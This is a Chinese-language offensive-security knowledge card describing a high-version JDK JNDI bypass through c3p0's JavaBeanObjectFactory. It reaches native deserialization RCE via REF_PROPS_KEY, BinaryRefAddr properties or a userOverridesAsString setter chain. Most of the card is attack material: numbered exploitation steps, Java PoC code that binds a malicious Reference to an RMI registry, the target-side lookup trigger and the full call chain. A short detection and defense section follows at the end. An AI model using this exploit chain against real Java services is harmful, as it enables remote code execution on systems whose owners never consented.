---
id: web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory
title: 高版本 JNDI 绕过：c3p0 JavaBeanObjectFactory 的 REF_PROPS_KEY 与 userOverridesAsString 反序列化
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-high-version-c3p0-javabeanobjectfactory
aliases:
- c3p0 JavaBeanObjectFactory
- REF_PROPS_KEY 反序列化
- JavaBeanReferenceMaker
- JNDI 高版本 c3p0
- userOverridesAsString JNDI
- HexAsciiSerializedMap JNDI
tags:
- java
- jndi
- c3p0
- javabeanobjectfactory
- deserialization
- high-version
- rce
- ldap
- rmi
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:25:34+08:00'
  notes: 已对照原文与全部 36 张图核对：图17/20/22 的 JavaBeanObjectFactory.getObjectInstance/createPropertyMap/findBean 与卡片一致（REF_PROPS_KEY→SerializableUtils.fromByteArray→readObject，BinaryRefAddr 属性同样反序列化，findBean 反射调用 setter）；图23-33 证实 setUserOverridesAsString→VetoableChangeSupport.fireVetoableChange→WrapperConnectionPoolDataSource.vetoableChange→C3P0ImplUtils.parseUserOverridesAsString→ByteUtils.fromHexAscii→SerializableUtils.fromByteArray(readObject) 并以计算器佐证；图34 证实 factoryClassLocation=null 绕过。原文未指定 gadget 版本/受影响区间，卡片已注明需 classpath 有可用 gadget，未设置 versions。PoC 未在本机执行。
---

## 一句话结论

高版本 JDK 下把 JNDI `Reference` 的 `factoryClassLocation` 置空、`factoryClassName` 指向本地 `com.mchange.v2.naming.JavaBeanObjectFactory`，即可绕过远程 codebase 限制；该工厂会对 `REF_PROPS_KEY`/`BinaryRefAddr` 属性调用 `SerializableUtils.fromByteArray`，或在 `findBean` 中调用 `setUserOverridesAsString`，最终走到 `ObjectInputStream.readObject`，配合 c3p0 与可用 gadget 实现不出网 RCE。

## 原理

- 高版本 `RegistryContext.decodeObject` 只在 `ref.getFactoryClassLocation() != null && !trustURLCodebase` 时抛异常；把 location 设为 `null`，并使用目标本地已有的工厂类，即可继续调用 `NamingManager.getObjectInstance`。
- `com.mchange.v2.naming.JavaBeanObjectFactory` 是 c3p0 提供的 `ObjectFactory`。其 `getObjectInstance` 逻辑：
  1. 把 `Reference` 的所有 `RefAddr` 按类型放入 map；
  2. `Class.forName(ref.getClassName())` 加载 bean 类；
  3. 取出 `BinaryRefAddr("com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY")`，对其字节内容调用 `SerializableUtils.fromByteArray(...)`，结果强转为 `Set`；
  4. 调用 `createPropertyMap(beanClass, map)`，对每个属性值：`StringRefAddr` 做类型转换，`BinaryRefAddr` 则调用 `SerializableUtils.fromByteArray(...)`；
  5. 调用 `findBean(beanClass, propertyMap, refProps)`，实例化 bean 并对每个属性调用 setter。
- `SerializableUtils.fromByteArray` 内部是 `deserializeFromByteArray` → `new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject()`，即完整原生反序列化。因此 `REF_PROPS_KEY` 或 `BinaryRefAddr` 属性值就是可控的 `readObject` 入口。
- 第三条路径：`findBean` 调用 `WrapperConnectionPoolDataSource.setUserOverridesAsString(String)`；setter 触发 `VetoableChangeSupport.fireVetoableChange`，最终到 `WrapperConnectionPoolDataSource$1.vetoableChange` → `C3P0ImplUtils.parseUserOverridesAsString` → `ByteUtils.fromHexAscii` → `SerializableUtils.fromByteArray` → `readObject`。字符串格式为 `HexAsciiSerializedMap:<hex>;`。
- 这三条路径都不需要目标出网，但要求 classpath 有 c3p0（提供工厂与 sink）以及可用的原生反序列化 gadget（如 CommonsCollections）。

## 触发条件

- 存在 JNDI 注入入口，攻击者能控制 lookup 的 URL 并返回恶意 `Reference`。
- 目标 JDK 为高版本（`trustURLCodebase=false`），但 classpath 含 c3p0（`com.mchange.v2.naming.JavaBeanObjectFactory`）。
- classpath 含可被 `readObject` 触发的 gadget 库，或存在其它危险 `readObject` 类。
- 目标未对 JNDI `Reference` 的 factory/className 做白名单，未启用严格序列化过滤。

## 利用步骤

1. 确认目标存在 JNDI 注入点，且 classpath 有 c3p0 与 gadget 库。
2. 选择入口：
   - **REF_PROPS_KEY**：`Reference("java.lang.Object", "com.mchange.v2.naming.JavaBeanObjectFactory", null)`，添加 `BinaryRefAddr(REF_PROPS_KEY, serializedBytes)`；
   - **BinaryRefAddr 属性**：选一个目标 bean 的可写属性，用 `BinaryRefAddr(属性名, serializedBytes)`；
   - **setter 链**：`Reference("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "com.mchange.v2.naming.JavaBeanObjectFactory", null)`，添加 `StringRefAddr("userOverridesAsString", "HexAsciiSerializedMap:<hex>;")`。
3. 将 Reference 绑定到 RMI 名称，或通过 LDAP 返回；确保 `factoryClassLocation` 为 `null`。
4. 触发目标 `lookup`；目标加载本地 JavaBeanObjectFactory，进入对应反序列化 sink。
5. 观察命令执行或外带信号。
6. 若 `REF_PROPS_KEY` 的 Set 强转失败，改用 `createPropertyMap` 的 BinaryRefAddr 或 setter 链；若目标无 c3p0，改用其它本地工厂（见关联卡）。

## PoC

REF_PROPS_KEY 入口（`<SER_BYTES>` 为序列化 Set/IndirectlySerialized 的字节，可用 Base64 工具还原）：

```java
Reference ref = new Reference(
    "java.lang.Object",
    "com.mchange.v2.naming.JavaBeanObjectFactory", null);

ref.add(new BinaryRefAddr(
    "com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY",
    Base64.getDecoder().decode("<BASE64_SERIALIZED_SET>")));

Registry registry = LocateRegistry.createRegistry(7777);
registry.bind("calc", new ReferenceWrapper(ref));
```

setter 链入口（`<HEX>` 为原生 gadget 的十六进制）：

```java
Reference ref = new Reference(
    "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "com.mchange.v2.naming.JavaBeanObjectFactory", null);

ref.add(new StringRefAddr(
    "userOverridesAsString",
    "HexAsciiSerializedMap:<HEX>;"));

Registry registry = LocateRegistry.createRegistry(7777);
registry.bind("calc", new ReferenceWrapper(ref));
```

目标侧触发：

```java
new InitialContext().lookup("rmi://127.0.0.1:7777/calc");
```

关键调用链（setter 路径）：

```text
InitialContext.lookup
 -> RegistryContext.decodeObject
 -> NamingManager.getObjectInstance
 -> JavaBeanObjectFactory.getObjectInstance
 -> JavaBeanObjectFactory.findBean
 -> WrapperConnectionPoolDataSource.setUserOverridesAsString
 -> VetoableChangeSupport.fireVetoableChange
 -> WrapperConnectionPoolDataSource$1.vetoableChange
 -> C3P0ImplUtils.parseUserOverridesAsString
 -> ByteUtils.fromHexAscii
 -> SerializableUtils.fromByteArray
 -> ObjectInputStream.readObject
```

## 变体与关联

- 变体：`REF_PROPS_KEY` 与 `createPropertyMap` 的 `BinaryRefAddr` 都是直接反序列化入口，前者要求结果可强转 `Set`，后者更灵活。
- 变体：setter 链可换其它 c3p0 可写属性，或换 `WrapperConnectionPoolDataSource` 的其它危险 setter。
- 变体：JNDI 入口可换成 Fastjson/LDAP 等能设置 `userOverridesAsString` 的组件；同一 sink 的 Fastjson 版本见关联卡。
- 关联：[[web-java-deser-fastjson-c3p0-hex-useroverrides]]（Fastjson 触发 `setUserOverridesAsString` 十六进制反序列化，sink 相同、入口不同）。
- 关联：[[web-java-deserialization-jndi-high-version-beanfactory-el]]（另一条高版本 JNDI 本地工厂绕过，使用 Tomcat BeanFactory+EL）。
- 关联：[[web-java-deser-c3p0-beanfactory-el-no-egress]]（c3p0 反序列化入口的 BeanFactory+EL 不出网链）。
- 注意：`REF_PROPS_KEY` 的内容必须是 `byte[]`，不是 Base64 字符串；需要先解码。setter 链的十六进制要完整，结尾分号不要漏。

## 检测与防御

- 修复：升级 JDK 并保持 `trustURLCodebase=false`；仅此不够，本地工厂链仍可利用。
- 加固：对 JNDI 返回的 `Reference` 做 factory 类白名单，拒绝 `com.mchange.v2.naming.JavaBeanObjectFactory`、`org.apache.naming.factory.BeanFactory` 等本地工厂；对 `REF_PROPS_KEY`、`userOverridesAsString` 等属性做拦截。
- 加固：移除或升级 c3p0；对反序列化入口设置 `ObjectInputFilter`/`jdk.serialFilter` 白名单；移除不必要的 gadget 库。
- 检测：JNDI 请求/日志中出现 `JavaBeanObjectFactory`、`REF_PROPS_KEY`、`JavaBeanReferenceMaker`、`userOverridesAsString`、`HexAsciiSerializedMap`；JVM 中出现 `SerializableUtils.fromByteArray` → `ObjectInputStream.readObject` 异常调用栈；异常 `ClassCastException`/`ConfigurationException` 可作为探测信号。
